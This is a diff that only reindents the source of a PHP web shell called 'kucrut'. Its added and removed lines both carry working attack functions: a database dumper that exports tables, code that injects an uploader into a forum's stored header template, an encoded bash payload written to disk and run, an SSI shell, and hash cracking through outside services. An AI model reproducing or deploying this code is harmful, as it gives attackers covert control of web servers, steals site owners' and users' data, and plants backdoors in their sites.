-		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
-			$v = trim($colors[$k]);
-		}else{
-			$v = trim(is_array($v)?$v["key_color"]:$v);
-		}
-		$array[$k] = $v;
-	}
-	$file = "kucrut_color_config_".date('Y-m-d-h_i_s').".conf";
-	$config = json_encode($array, JSON_PRETTY_PRINT);
-	if(!@file_put_contents($file, $config)){
-		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
-	}else{
-		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
-	}
+    echo __pre();
+    $colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
+    $glob_colors = $GLOBALS["__HOST_COLOR__"];
+    $array = array();
+    foreach($glob_colors as $k => $v){
+        if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
+            $v = trim($colors[$k]);
+        }else{
+            $v = trim(is_array($v)?$v["key_color"]:$v);
+        }
+        $array[$k] = $v;
+    }
+    $file = "kucrut_color_config_".date('Y-m-d-h_i_s').".conf";
+    $config = json_encode($array, JSON_PRETTY_PRINT);
+    if(!@file_put_contents($file, $config)){
+        echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
+    }else{
+        echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
+    }
 }
 if($_POST['kucrut2']=='>>'){
-	echo __pre();
-	$colors = json_decode($_POST["kucrut1"],true);
-	$array = "";
-	$is_default = isset($_POST["kucrut3"])&&$_POST["kucrut3"]=="1"?true:false;
-	$glob_colors = $GLOBALS["__HOST_COLOR__"];
-	foreach($glob_colors as $k => $v){
-		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
-			$v = trim($colors[$k]);
-		}else{
-			$v = trim(is_array($v)?$v["key_color"]:$v);
-		}
-		$array .= '"'.trim($k).'" => "'.$v.'",';
-	}
-	@chdir($GLOBALS['home_cwd']);
-	$basename = @basename($_SERVER['PHP_SELF']);
-	$data = @file_get_contents($basename);
-	$color = '/\'color\'(.*?)\),/s';
-	if(preg_match($color,$data,$e)){
-		$new = "'color' => array(".$array."),";
-		$data = str_replace($e[0],$new,$data);
-		if(@file_put_contents($basename, $data)){
-			echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
-		}else{
-			echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
-		}
-	}else{
-		echo("<center><p><h3>[-] Error...!</h3></p></center>");
-	}
+    echo __pre();
+    $colors = json_decode($_POST["kucrut1"],true);
+    $array = "";
+    $is_default = isset($_POST["kucrut3"])&&$_POST["kucrut3"]=="1"?true:false;
+    $glob_colors = $GLOBALS["__HOST_COLOR__"];
+    foreach($glob_colors as $k => $v){
+        if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
+            $v = trim($colors[$k]);
+        }else{
+            $v = trim(is_array($v)?$v["key_color"]:$v);
+        }
+        $array .= '"'.trim($k).'" => "'.$v.'",';
+    }
+    @chdir($GLOBALS['home_cwd']);
+    $basename = @basename($_SERVER['PHP_SELF']);
+    $data = @file_get_contents($basename);
+    $color = '/\'color\'(.*?)\),/s';
+    if(preg_match($color,$data,$e)){
+        $new = "'color' => array(".$array."),";
+        $data = str_replace($e[0],$new,$data);
+        if(@file_put_contents($basename, $data)){
+            echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
+        }else{
+            echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
+        }
+    }else{
+        echo("<center><p><h3>[-] Error...!</h3></p></center>");
+    }
 }
 }
 echo('</div>');
@@ -1957,82 +1957,82 @@ create_table($table);
 echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
 $db = false;
 if(!empty($dbname)){
-	$db = @mysqli_connect($host, $username, $password, $dbname);
+    $db = @mysqli_connect($host, $username, $password, $dbname);
 }
 if(count($selected_data) > 0){
-	if($db){
-		if(!is_dir($dfile)){
-			$dfile = $GLOBALS['cwd'];
-		}
-		$tbls = "";
-		$ext = '.txt';
-		if($delimiter == 'json'){
-			$ext = '.json';
-		}
-		foreach ($selected_data as $tbl => $cols) {
-			$tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
-			$file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
-			$fp = fopen($file_name, "w");
-			$data = array();
-			while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
-				if($delimiter == "json"){
-					$col_arr = array();
-					foreach ($row as $key => $value) {
-						if(empty($value)){
-							$value = "[empty]";
-						}
-						 $col_arr[$key] = $value;
-					}
-					$data[$tbl][] = $col_arr;
-				}else{
-					$data = "";
-					foreach ($row as $key => $value) {
-						if(empty($value)){
-							$value = "[empty]";
-						}
-						$data .= $value . $delimiter;
-					}
-					fwrite($fp, $data ."\n");
-				}
-			}
-			if($delimiter == "json"){
-				fwrite($fp, json_encode($data));
-			}
-			fclose($fp);
-			$tbls .= "Done ~~~> ".$file_name."<br>";
-		}
-		echo __pre();
-		echo "<center><font color='#00FF00'>".$tbls."</font></center>";
-	}
+    if($db){
+        if(!is_dir($dfile)){
+            $dfile = $GLOBALS['cwd'];
+        }
+        $tbls = "";
+        $ext = '.txt';
+        if($delimiter == 'json'){
+            $ext = '.json';
+        }
+        foreach ($selected_data as $tbl => $cols) {
+            $tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
+            $file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
+            $fp = fopen($file_name, "w");
+            $data = array();
+            while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
+                if($delimiter == "json"){
+                    $col_arr = array();
+                    foreach ($row as $key => $value) {
+                        if(empty($value)){
+                            $value = "[empty]";
+                        }
+                         $col_arr[$key] = $value;
+                    }
+                    $data[$tbl][] = $col_arr;
+                }else{
+                    $data = "";
+                    foreach ($row as $key => $value) {
+                        if(empty($value)){
+                            $value = "[empty]";
+                        }
+                        $data .= $value . $delimiter;
+                    }
+                    fwrite($fp, $data ."\n");
+                }
+            }
+            if($delimiter == "json"){
+                fwrite($fp, json_encode($data));
+            }
+            fclose($fp);
+            $tbls .= "Done ~~~> ".$file_name."<br>";
+        }
+        echo __pre();
+        echo "<center><font color='#00FF00'>".$tbls."</font></center>";
+    }
 }
 if(!empty($dbname) && count($selected_data) == 0){
 //echo __pre();
 if($db){
-	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
-	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
-	$data = array();
-	$tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
-	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
-		$data[$row["table_name"]] = array();
-		$table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
-		$table_count = mysqli_fetch_row($table_count_q);
-		$data[$row["table_name"]]["data_count"] = $table_count[0];
-		$columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
-		while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-			$data[$row["table_name"]]["cols"][] = $row2["column_name"];
-		}
-	}
-	mysqli_close($db);
+    echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
+    echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
+    $data = array();
+    $tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
+    while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
+        $data[$row["table_name"]] = array();
+        $table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
+        $table_count = mysqli_fetch_row($table_count_q);
+        $data[$row["table_name"]]["data_count"] = $table_count[0];
+        $columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
+        while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
+            $data[$row["table_name"]]["cols"][] = $row2["column_name"];
+        }
+    }
+    mysqli_close($db);
 
-	echo '<ul id="myUL">';
-	foreach($data as $tbl => $cols){
-	    echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
-	    foreach($cols["cols"] as $col){
-	        echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
-	    }
-	    echo '</ul></li>';
-	}
-	echo '</ul>';
+    echo '<ul id="myUL">';
+    foreach($data as $tbl => $cols){
+        echo '<li><span style="color:#00FF00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
+        foreach($cols["cols"] as $col){
+            echo '<li tbl="'.$tbl.'"><span style="color:#00FF00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
+        }
+        echo '</ul></li>';
+    }
+    echo '</ul>';
 }else{
 echo('<center>mysqli_connect : Error!</center>');
 }
@@ -2356,13 +2356,13 @@ $recivedata = @mysqli_query($conn,$rec);
 $getd = @mysqli_fetch_assoc($recivedata);
 $savetoass = $getd['template'];
 if(empty($savetoass)){
-	$faq_name = "header";
-	$faq_file = "/";
-	$rec = "select `template` from ".$_POST['kucrut6']."template WHERE title ='".$faq_name."'";
-	$recivedata = @mysqli_query($conn,$rec);
-	$getd = @mysqli_fetch_assoc($recivedata);
-	$savetoass = $getd['template'];
-	$code = KUCRUT_UPLOADER.";";
+    $faq_name = "header";
+    $faq_file = "/";
+    $rec = "select `template` from ".$_POST['kucrut6']."template WHERE title ='".$faq_name."'";
+    $recivedata = @mysqli_query($conn,$rec);
+    $getd = @mysqli_fetch_assoc($recivedata);
+    $savetoass = $getd['template'];
+    $code = KUCRUT_UPLOADER.";";
 }
 $code = str_replace("'","\'",$code);
 $p = "UPDATE ".$_POST['kucrut6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
@@ -2371,9 +2371,9 @@ $geturl = @mysqli_query($conn,"select `value` from ".$_POST['kucrut6']."setting 
 $getval = @mysqli_fetch_assoc($geturl);
 $saveval = $getval['value'];
 if($faq_name == "header"){
-	if(substr($saveval, -5, 5) == "/core"){
-		$saveval = substr($saveval, 0, -5);
-	}
+    if(substr($saveval, -5, 5) == "/core"){
+        $saveval = substr($saveval, 0, -5);
+    }
 }
 $realurl = parse_url($saveval,PHP_URL_HOST);
 $realpath = parse_url($saveval,PHP_URL_PATH);
@@ -2409,45 +2409,45 @@ echo '</div>';
 kucrutfooter();
 }
 function kucrutcheckfiletype(){
-	$path = $_POST['path'];
-	$arg = $_POST['arg'];
-	if(@is_file($path.'/'.$arg)){
-		echo("file");
-	}else{
-		echo("dir");
-	}
+    $path = $_POST['path'];
+    $arg = $_POST['arg'];
+    if(@is_file($path.'/'.$arg)){
+        echo("file");
+    }else{
+        echo("dir");
+    }
 }
 function kucrutWriteTocgiapi($name, $source){
-	$temp = "";
-	$not_api = array("basedir.kucrut", "getdir.kucrut", "getheader.kucrut");
-	if(in_array($name, $not_api)){
-		$temp = KUCRUT_TEMPDIR;
-		if($temp){
-			@chdir($temp);
-		}
-	}else{
-		kucrutCreateParentFolder();
-		@chdir($GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__);
-	}
-	@mkdir('kucrutcgiapi',0755);
-	__write_file("kucrutcgiapi/".$name, __get_resource($source));
-	@chmod("kucrutcgiapi/".$name, 0755);
-	return $temp;
+    $temp = "";
+    $not_api = array("basedir.kucrut", "getdir.kucrut", "getheader.kucrut");
+    if(in_array($name, $not_api)){
+        $temp = KUCRUT_TEMPDIR;
+        if($temp){
+            @chdir($temp);
+        }
+    }else{
+        kucrutCreateParentFolder();
+        @chdir($GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__);
+    }
+    @mkdir('kucrutcgiapi',0755);
+    __write_file("kucrutcgiapi/".$name, __get_resource($source));
+    @chmod("kucrutcgiapi/".$name, 0755);
+    return $temp;
 }
 function kucrutcheckcgi(){if(strlen(kucrutEx("id",false,true,true))>0)echo("ok");else echo("no");}
 function kucrutupdateheader(){
-	if(!isset($_COOKIE["updateheader_data"])){
-		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
-		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
-		$tmp_path = kucrutWriteTocgiapi("getheader.kucrut",$bash);
-		$data = kucrutEx("cd '{$tmp_path}/kucrutcgiapi';sh getheader.kucrut",false,true,true);
-		if(@is_array(@json_decode($data,true))){
-			__kucrut_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
-			echo $data;
-		}
-	}else{
-		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
-	}
+    if(!isset($_COOKIE["updateheader_data"])){
+        $bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
+        $realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
+        $tmp_path = kucrutWriteTocgiapi("getheader.kucrut",$bash);
+        $data = kucrutEx("cd '{$tmp_path}/kucrutcgiapi';sh getheader.kucrut",false,true,true);
+        if(@is_array(@json_decode($data,true))){
+            __kucrut_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
+            echo $data;
+        }
+    }else{
+        echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
+    }
 }
 function kucrutssiShell(){
 kucruthead();
@@ -2556,10 +2556,10 @@ $resp = $get->Send($target);
 }
 echo __pre().'<center>';
 switch($resp){
-	case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
-	case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
-	case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
-	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
+    case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
+    case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
+    case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
+    case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
 }
 if(substr($resp,0,4)!='CODE'&&$resp!=''){
 echo "<b>Result: <font color='green'>".$resp."</font></b>";
@@ -2581,9 +2581,9 @@ $curl = new KucrutCURL();
 $resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
 echo(__pre().'<center>');
 if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
-	echo('<font color="green">'.$s[1].'</font>');
+    echo('<font color="green">'.$s[1].'</font>');
 }else{
-	echo('<font color="red">Not Found...!</font>');
+    echo('<font color="red">Not Found...!</font>');
 }
 echo('</center><br>');
 }
@@ -2650,56 +2650,56 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <div id=\"filesman-tab-full-path\"></div>
 <div id='alert-area' class='alert-area'></div>
 <div class='cl-popup-fixed' style='display:none;'>
-	<div id='shortcutMenu-holder'>
-		<div class='popup-head'></div>
-			<form autocomplete='off' onSubmit='return false;'>
-				<label class='old-path-lbl'></label>
-				<div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
-				<label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
-				<input type='text' name='fname'>
-				<div class='perm-table-holder'>
-					<table>
-					   <tbody>
-					      <tr>
-					         <td><b>Mode</b></td>
-					         <td>User</td>
-					         <td>Group</td>
-					         <td>World</td>
-					      </tr>
-					      <tr>
-					         <td>Read</td>
-					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
-					      </tr>
-					      <tr>
-					         <td>Write</td>
-					         <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
-					      </tr>
-					      <tr>
-					         <td>Execute</td>
-					         <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
-					      </tr>
-					      <tr>
-					         <td>Permission</td>
-					         <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
-					         <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
-					         <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
-					      </tr>
-					   </tbody>
-					</table>
-				</div>
+    <div id='shortcutMenu-holder'>
+        <div class='popup-head'></div>
+            <form autocomplete='off' onSubmit='return false;'>
+                <label class='old-path-lbl'></label>
+                <div style='overflow: hidden;white-space: nowrap;text-overflow: ellipsis;' class='old-path-content'></div>
+                <label style='margin-top:10px;' class='new-filename-lbl'>New file name</label>
+                <input type='text' name='fname'>
+                <div class='perm-table-holder'>
+                    <table>
+                       <tbody>
+                          <tr>
+                             <td><b>Mode</b></td>
+                             <td>User</td>
+                             <td>Group</td>
+                             <td>World</td>
+                          </tr>
+                          <tr>
+                             <td>Read</td>
+                             <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
+                             <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
+                             <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
+                          </tr>
+                          <tr>
+                             <td>Write</td>
+                             <td><input type='checkbox' name='uw' value='2' onclick='calcperm();'></td>
+                             <td><input type='checkbox' name='gw' value='2' onclick='calcperm();'></td>
+                             <td><input type='checkbox' name='ww' value='2' onclick='calcperm();'></td>
+                          </tr>
+                          <tr>
+                             <td>Execute</td>
+                             <td><input type='checkbox' name='ux' value='1' onclick='calcperm();'></td>
+                             <td><input type='checkbox' name='gx' value='1' onclick='calcperm();'></td>
+                             <td><input type='checkbox' name='wx' value='1' onclick='calcperm();'></td>
+                          </tr>
+                          <tr>
+                             <td>Permission</td>
+                             <td><input style='width:60px;' type='text' name='u' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"u\", [\"u\"]);'></td>
+                             <td><input style='width:60px;' type='text' name='g' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"g\", [\"g\"]);'></td>
+                             <td><input style='width:60px;' type='text' name='w' maxlength='1' oninput='this.value=this.value.replace(/[^0-7]/g,0);autoCheckPerms(this.value, \"w\", [\"w\"]);'></td>
+                          </tr>
+                       </tbody>
+                    </table>
+                </div>
 
-			</form>
-		<div class='popup-foot'>
-			<button style='background: #2b5225;' name='accept' action='' onclick='kucrutPopUpDoAction(this);'></button>
-			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
-		</div>
-	</div>
+            </form>
+        <div class='popup-foot'>
+            <button style='background: #2b5225;' name='accept' action='' onclick='kucrutPopUpDoAction(this);'></button>
+            <button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
+        </div>
+    </div>
 </div>";?>
 <script>
 function kucrutMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:kucrutb64("Sql_manager_api"),c_:kucrutb64(c_),kucrut1:kucrutb64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("kucrut2")&&"load_data"!=e.post.kucrut2&&"page"!=e.post.kucrut2&&"edit"!=e.post.kucrut2&&"delete"!=e.post.kucrut2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=kucrutb64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";kucrutloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){kucrutloader(e.db_id,"none"),t(a)},!0,e.db_id)}function kucrutMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function kucrutMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;kucrutMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{kucrut2:"load_all_tables",kucrut3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);kucrutMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?kucrutMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://solevisible.com/icons/menu/b_minus.png")}})}else if(void 0===t)for(var n in kucrutMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)kucrutMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)kucrutMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://solevisible.com/icons/menu/"+s}}function kucrutMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="https://solevisible.com/icons/menu/"+l}function kucrutMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?kucrutMysqlTableMode(a,t):kucrutMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{kucrut2:"load_tables",kucrut3:i}},function(e){0!=e.length&&kucrutMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function kucrutMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function kucrutMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function kucrutMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&kucrutMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{kucrut2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?kucrutMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function kucrutMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="kucrutMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"kucrutLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="kucrutMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" 